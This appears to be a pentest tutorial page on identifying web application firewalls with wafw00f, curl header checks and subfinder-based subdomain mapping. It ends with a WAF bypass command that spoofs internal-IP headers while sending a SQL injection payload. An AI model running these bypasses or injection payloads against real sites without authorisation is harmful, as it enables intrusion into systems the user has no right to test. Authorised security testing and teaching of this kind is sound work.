// WHAT IS A WAF?

A Web Application Firewall (WAF) sits between a client and a web server, filtering malicious requests. Knowing which WAF is running lets you pick the right bypass technique — what works against Cloudflare won't work against AWS WAF. WAF detection is step one of any serious web pentest.

STEP 2 — BASIC DETECTION SCRIPTS
🔍 Single Target Scan
BASIC
Detect the WAF on a single target. Replace the URL with your target.
# Basic WAF detection wafw00f https://target.com # With verbose output wafw00f -v https://target.com # Test all WAFs (slower but thorough) wafw00f -a https://target.com
📋 Bulk Target Scan
BASIC
Scan multiple targets from a list file. One URL per line in targets.txt.
# Create targets file cat > targets.txt << 'EOF' https://target1.com https://target2.com https://target3.com EOF # Scan all targets wafw00f -i targets.txt # Save results to file wafw00f -i targets.txt -o results.txt
STEP 3 — ADVANCED SCRIPTS
🧠 Full Recon + WAF Script
ADVANCED
Combines WAF detection with header grabbing and response analysis for a full picture.
# Full WAF recon script TARGET="https://target.com" echo "[*] Target: $TARGET" echo "" # Check headers first echo "[*] Grabbing headers..." curl -sI $TARGET | grep -iE "server|x-powered|cf-ray|x-cache|via|x-waf" echo "" echo "[*] Running wafw00f..." wafw00f -a -v $TARGET echo "" echo "[*] Done."
🌐 Subdomain WAF Mapper
ADVANCED
Maps WAFs across all subdomains of a target. Useful for bug bounty scope recon.
# Install subfinder first if needed # go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest DOMAIN="target.com" echo "[*] Finding subdomains for $DOMAIN..." subfinder -d $DOMAIN -silent > subs.txt echo "[*] Found $(wc -l < subs.txt) subdomains" echo "[*] Running WAF detection on each..." while read sub; do echo -n " $sub → " wafw00f -a "https://$sub" 2>/dev/null | grep -oE "(No WAF|[A-Za-z]+ WAF)" | head -1 done < subs.txt echo "[*] Scan complete."

🔓 Generic WAF Bypass Headers
BYPASS
Headers that trick WAFs into thinking the request is internal or trusted.
# Bypass using spoofed headers TARGET="https://target.com" PAYLOAD="?id=1 UNION SELECT 1,2,3--" curl -s \ -H "X-Forwarded-For: 127.0.0.1" \ -H "X-Real-IP: 127.0.0.1" \ -H "X-Originating-IP: 127.0.0.1" \ -H "X-Remote-IP: 127.0.0.1" \ -H "X-Client-IP: 127.0.0.1" \ -H "CF-Connecting-IP: 127.0.0.1" \ "$TARGET$PAYLOAD"
